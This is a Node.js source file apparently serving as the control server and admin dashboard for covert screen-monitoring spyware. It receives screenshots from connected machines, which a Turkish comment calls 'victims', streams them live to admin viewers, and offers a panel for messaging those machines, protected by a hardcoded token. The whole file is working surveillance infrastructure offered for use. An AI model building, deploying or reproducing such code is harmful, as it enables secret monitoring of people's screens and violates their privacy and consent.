const express = require('express');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const AUTH_TOKEN = process.env.AUTH_TOKEN || "screen-stream-secret-123";
const PORT = process.env.PORT || 3000;

const streamers = new Map();
const adminViewers = new Set();

console.log(`[${new Date().toLocaleTimeString()}] 🚀 Multi-Stream Server başlıyor...`);
console.log(`[${new Date().toLocaleTimeString()}] Port: ${PORT}`);

app.use(express.json({ limit: '50mb' }));

app.get('/', (req, res) => {
  res.send(ADMIN_PANEL_PRO);
});

app.get('/api/streamers', (req, res) => {
  const list = Array.from(streamers.values()).map(s => ({
    id: s.id,
    hostname: s.hostname,
    connected: true,
    lastUpdate: s.lastUpdate
  }));
  res.json({ streamers: list });
});

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const token = url.searchParams.get('token');
  const mode = url.searchParams.get('mode');

  if (token !== AUTH_TOKEN) {
    ws.close(1008, 'Unauthorized');
    return;
  }

  if (mode === 'streamer') {
    const streamerId = `streamer-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    const streamer = {
      id: streamerId,
      hostname: 'Unknown',
      ws: ws,
      lastUpdate: Date.now()
    };

    streamers.set(streamerId, streamer);
    console.log(`[${new Date().toLocaleTimeString()}] ✅ Streamer bağlandı: ${streamerId}`);

    broadcastToAdmins({
      type: 'streamer_connected',
      streamerId: streamerId,
      totalStreamers: streamers.size
    });

    ws.on('message', (data) => {
      try {
        const msg = JSON.parse(data);

        if (msg.type === 'screenshot') {
          streamer.hostname = msg.hostname || 'Unknown';
          streamer.lastUpdate = Date.now();

          broadcastToAdmins({
            type: 'screenshot',
            streamerId: streamerId,
            hostname: msg.hostname,
            data: msg.data,
            timestamp: msg.timestamp
          });
        } else if (msg.type === 'send_message') {
          // Admin'den kurban'a mesaj gönder
          if (streamer.ws.readyState === WebSocket.OPEN) {
            streamer.ws.send(JSON.stringify({
              type: 'admin_message',
              message: msg.message
            }));
          }
        }
      } catch (e) {
        console.error('Message parse error:', e.message);
      }
    });

    ws.on('close', () => {
      streamers.delete(streamerId);
      console.log(`[${new Date().toLocaleTimeString()}] ❌ Streamer ayrıldı: ${streamerId}`);

      broadcastToAdmins({
        type: 'streamer_disconnected',
        streamerId: streamerId,
        totalStreamers: streamers.size
      });
    });

  } else if (mode === 'admin') {
    adminViewers.add(ws);
    console.log(`[${new Date().toLocaleTimeString()}] 👁️ Admin bağlandı (Total: ${adminViewers.size})`);

    const streamersList = Array.from(streamers.values()).map(s => ({
      id: s.id,
      hostname: s.hostname,
      lastUpdate: s.lastUpdate
    }));

    ws.send(JSON.stringify({
      type: 'initial_state',
      streamers: streamersList
    }));

    ws.on('close', () => {
      adminViewers.delete(ws);
      console.log(`[${new Date().toLocaleTimeString()}] Admin ayrıldı`);
    });
  }
});

function broadcastToAdmins(message) {
  const data = JSON.stringify(message);
  adminViewers.forEach(admin => {
    if (admin.readyState === WebSocket.OPEN) {
      admin.send(data);
    }
  });
}

server.listen(PORT, () => {
  console.log(`[${new Date().toLocaleTimeString()}] ✨ Server: http://localhost:${PORT}`);
});

const ADMIN_PANEL_PRO = `<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🎥 Admin Panel Pro - Screen Monitor</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #fff;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      min-height: 100vh;
    }

    .container {
      display: flex;
      height: 100vh;
    }

    .sidebar {
      width: 320px;
      background: rgba(10, 20, 50, 0.95);
      backdrop-filter: blur(10px);
      border-right: 1px solid rgba(255, 255, 255, 0.1);
      display: flex;
      flex-direction: column;
      padding: 0;
    }

    .sidebar-header {
      padding: 24px 20px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      background: rgba(0, 0, 0, 0.3);
    }

    .logo {
      font-size: 24px;
      font-weight: 800;
      display: flex;
      align-items: center;
      gap: 12px;
      letter-spacing: -0.5px;
    }

    .stats {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-top: 16px;
      font-size: 13px;
    }

    .stat {
      background: rgba(102, 126, 234, 0.2);
      border: 1px solid rgba(102, 126, 234, 0.3);
      padding: 8px 12px;
      border-radius: 8px;
      text-align: center;
    }

    .stat-value {
      font-weight: 700;
      font-size: 18px;
      color: #667eea;
    }

    .stat-label {
      opacity: 0.7;
      font-size: 11px;
      text-transform: uppercase;
      margin-top: 4px;
    }

    .streamer-list {
      flex: 1;
      overflow-y: auto;
      padding: 12px;
    }

    .streamer-item {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 12px;
      margin-bottom: 8px;
      cursor: pointer;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      position: relative;
      overflow: hidden;
    }

    .streamer-item::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
      transition: left 0.5s;
    }

    .streamer-item:hover {
      background: rgba(102, 126, 234, 0.2);
      border-color: rgba(102, 126, 234, 0.5);
      transform: translateX(4px);
    }

    .streamer-item:hover::before {
      left: 100%;
    }

    .streamer-item.active {
      background: linear-gradient(135deg, rgba(102, 126, 234, 0.3), rgba(118, 75, 162, 0.3));
      border-color: #667eea;
      box-shadow: 0 0 20px rgba(102, 126, 234, 0.4);
    }

    .streamer-name {
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 6px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .streamer-status {
      width: 8px;
      height: 8px;
      background: #4ade80;
      border-radius: 50%;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); }
      50% { opacity: 0.8; }
    }

    .streamer-time {
      font-size: 12px;
      opacity: 0.5;
    }

    .main-view {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 20px;
      gap: 16px;
      position: relative;
    }

    .header {
      background: rgba(10, 20, 50, 0.6);
      backdrop-filter: blur(10px);
      padding: 16px 24px;
      border-radius: 16px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .header-title {
      font-size: 20px;
      font-weight: 700;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .video-container {
      flex: 1;
      background: linear-gradient(135deg, rgba(10, 20, 50, 0.8), rgba(50, 30, 80, 0.8));
      border-radius: 16px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow: hidden;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    }

    #liveStream {
      max-width: 100%;
      max-height: 100%;
      object-fit: contain;
    }

    .empty-state {
      text-align: center;
      color: rgba(255, 255, 255, 0.4);
    }

    .empty-state-icon {
      font-size: 60px;
      margin-bottom: 16px;
      opacity: 0.3;
    }

    .empty-state-text {
      font-size: 16px;
      font-weight: 500;
    }

    .stream-info {
      position: absolute;
      bottom: 16px;
      right: 16px;
      background: rgba(10, 20, 50, 0.9);
      backdrop-filter: blur(10px);
      padding: 12px 16px;
      border-radius: 12px;
      border: 1px solid rgba(102, 126, 234, 0.3);
      font-size: 13px;
      display: none;
    }

    .stream-info.active {
      display: block;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      gap: 20px;
      margin-top: 8px;
    }

    .info-item {
      display: flex;
      flex-direction: column;
      gap: 2px;
    }

    .info-label {
      opacity: 0.6;
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .info-value {
      font-weight: 600;
      color: #667eea;
      font-size: 14px;
    }

    .message-panel {
      position: absolute;
      bottom: 20px;
      left: 20px;
      background: rgba(10, 20, 50, 0.95);
      backdrop-filter: blur(10px);
      padding: 12px;
      border-radius: 12px;
      border: 1px solid rgba(102, 126, 234, 0.3);
      display: none;
      z-index: 10;
    }

    .message-panel.active {
      display: flex;
      gap: 6px;
      align-items: center;
    }

    #messageInput {
      padding: 8px 12px;
      border-radius: 6px;
      border: 1px solid rgba(102, 126, 234, 0.3);
      background: rgba(102, 126, 234, 0.1);
      color: white;
      font-size: 12px;
      width: 220px;
      outline: none;
    }

    #messageInput::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }

    #sendMessageBtn {
      padding: 8px 14px;
      background: #667eea;
      border: none;
      border-radius: 6px;
      color: white;
      cursor: pointer;
      font-size: 12px;
      font-weight: 600;
      transition: all 0.2s;
    }

    #sendMessageBtn:hover {
      background: #764ba2;
      transform: scale(1.05);
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255, 255, 255, 0.1);
      border-top-color: #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    ::-webkit-scrollbar {
      width: 6px;
    }

    ::-webkit-scrollbar-track {
      background: rgba(255, 255, 255, 0.05);
    }

    ::-webkit-scrollbar-thumb {
      background: rgba(102, 126, 234, 0.3);
      border-radius: 3px;
    }

    ::-webkit-scrollbar-thumb:hover {
      background: rgba(102, 126, 234, 0.5);
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Sidebar -->
    <div class="sidebar">
      <div class="sidebar-header">
        <div class="logo">
          🎥 ScreenMonitor
        </div>
        <div class="stats">
          <div class="stat">
            <div class="stat-value" id="streamerCount">0</div>
            <div class="stat-label">Active</div>
          </div>
          <div class="stat">
            <div class="stat-value" id="adminCount">1</div>
            <div class="stat-label">Viewers</div>
          </div>
        </div>
      </div>
      <div class="streamer-list" id="streamerList">
        <div style="text-align: center; padding: 40px 20px; opacity: 0.5;">
          <div style="font-size: 32px; margin-bottom: 10px;">📡</div>
          <div>Waiting for devices...</div>
        </div>
      </div>
    </div>

    <!-- Main View -->
    <div class="main-view">
      <div class="header">
        <div class="header-title">
          <span id="selectedStreamer">Select a device</span>
        </div>
        <div style="display: flex; gap: 12px; font-size: 12px;">
          <span style="opacity: 0.6;">•</span>
          <span id="statusText" style="opacity: 0.6;">Ready</span>
        </div>
      </div>

      <div class="video-container" id="videoContainer">
        <div class="empty-state">
          <div class="empty-state-icon">👈</div>
          <div class="empty-state-text">Select a device from the list</div>
        </div>
      </div>

      <div class="stream-info" id="streamInfo">
        <div>Live Stream</div>
        <div class="info-row">
          <div class="info-item">
            <div class="info-label">Resolution</div>
            <div class="info-value" id="streamRes">-</div>
          </div>
          <div class="info-item">
            <div class="info-label">FPS</div>
            <div class="info-value" id="streamFps">0</div>
          </div>
        </div>
      </div>

      <div class="message-panel" id="messagePanel">
        <input type="text" id="messageInput" placeholder="Mesaj yazınız...">
        <button id="sendMessageBtn" onclick="sendMessage()">Gönder</button>
      </div>
    </div>
  </div>

  <script>
    const AUTH_TOKEN = "screen-stream-secret-123";
    const streamerListEl = document.getElementById("streamerList");
    const selectedStreamerEl = document.getElementById("selectedStreamer");
    const videoContainer = document.getElementById("videoContainer");
    const streamInfo = document.getElementById("streamInfo");
    const messagePanel = document.getElementById("messagePanel");
    const streamerCountEl = document.getElementById("streamerCount");
    const statusTextEl = document.getElementById("statusText");

    let ws = null;
    let streamers = new Map();
    let selectedStreamerId = null;
    let frameCount = 0;
    let lastFpsTime = Date.now();

    function connect() {
      const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
      const wsUrl = \`\${protocol}//\${window.location.host}/?token=\${AUTH_TOKEN}&mode=admin\`;

      ws = new WebSocket(wsUrl);

      ws.onopen = () => {
        statusTextEl.textContent = "Connected";
        statusTextEl.style.color = "#4ade80";
      };

      ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);

          if (msg.type === "initial_state") {
            msg.streamers.forEach(s => streamers.set(s.id, s));
            updateStreamerList();
          } else if (msg.type === "streamer_connected") {
            fetch('/api/streamers')
              .then(r => r.json())
              .then(data => {
                streamers.clear();
                data.streamers.forEach(s => streamers.set(s.id, s));
                updateStreamerList();
                streamerCountEl.textContent = data.streamers.length;
              });
          } else if (msg.type === "streamer_disconnected") {
            streamers.delete(msg.streamerId);
            if (selectedStreamerId === msg.streamerId) {
              selectedStreamerId = null;
              clearVideo();
            }
            updateStreamerList();
            streamerCountEl.textContent = msg.totalStreamers;
          } else if (msg.type === "screenshot") {
            if (msg.streamerId === selectedStreamerId) {
              displayScreenshot(msg.data);
              selectedStreamerEl.textContent = \`🔴 \${msg.hostname}\`;
              frameCount++;

              const now = Date.now();
              if (now - lastFpsTime >= 1000) {
                document.getElementById("streamFps").textContent = frameCount;
                frameCount = 0;
                lastFpsTime = now;
              }
            }
          }
        } catch (e) {
          console.error("Parse error:", e);
        }
      };

      ws.onerror = () => {
        statusTextEl.textContent = "Error";
        statusTextEl.style.color = "#ef4444";
      };

      ws.onclose = () => {
        statusTextEl.textContent = "Disconnected";
        statusTextEl.style.color = "#f97316";
        setTimeout(connect, 3000);
      };
    }

    function updateStreamerList() {
      if (streamers.size === 0) {
        streamerListEl.innerHTML = '<div style="text-align: center; padding: 40px 20px; opacity: 0.5;"><div style="font-size: 32px; margin-bottom: 10px;">📡</div><div>Waiting for devices...</div></div>';
        return;
      }

      streamerListEl.innerHTML = '';
      streamers.forEach(streamer => {
        const item = document.createElement('div');
        item.className = 'streamer-item' + (selectedStreamerId === streamer.id ? ' active' : '');
        item.innerHTML = \`
          <div class="streamer-name">
            <div class="streamer-status"></div>
            \${streamer.hostname}
          </div>
          <div class="streamer-time">\${new Date(streamer.lastUpdate).toLocaleTimeString()}</div>
        \`;
        item.onclick = () => selectStreamer(streamer.id, streamer.hostname);
        streamerListEl.appendChild(item);
      });
    }

    function selectStreamer(streamerId, hostname) {
      selectedStreamerId = streamerId;
      selectedStreamerEl.textContent = \`🔴 \${hostname}\`;
      streamInfo.classList.add("active");
      messagePanel.classList.add("active");
      clearVideo();
      updateStreamerList();
    }

    function displayScreenshot(dataUrl) {
      let img = document.getElementById("liveStream");

      if (!img) {
        videoContainer.innerHTML = '';
        img = document.createElement("img");
        img.id = "liveStream";
        videoContainer.appendChild(img);
      }

      img.onload = () => {
        document.getElementById("streamRes").textContent = \`\${img.naturalWidth}×\${img.naturalHeight}\`;
      };

      img.src = dataUrl;
    }

    function clearVideo() {
      videoContainer.innerHTML = '<div class="empty-state"><div class="empty-state-icon">👁️</div><div class="empty-state-text">Stream will appear here</div></div>';
      streamInfo.classList.remove("active");
      frameCount = 0;
    }

    function sendMessage() {
      const msg = document.getElementById("messageInput").value;
      if (!msg || !selectedStreamerId) return;

      ws.send(JSON.stringify({
        type: 'send_message',
        streamerId: selectedStreamerId,
        message: msg
      }));

      document.getElementById("messageInput").value = '';
    }

    document.getElementById("messageInput").addEventListener("keypress", (e) => {
      if (e.key === "Enter") sendMessage();
    });

    connect();

    window.addEventListener("focus", () => {
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        connect();
      }
    });
  </script>
</body>
</html>`;
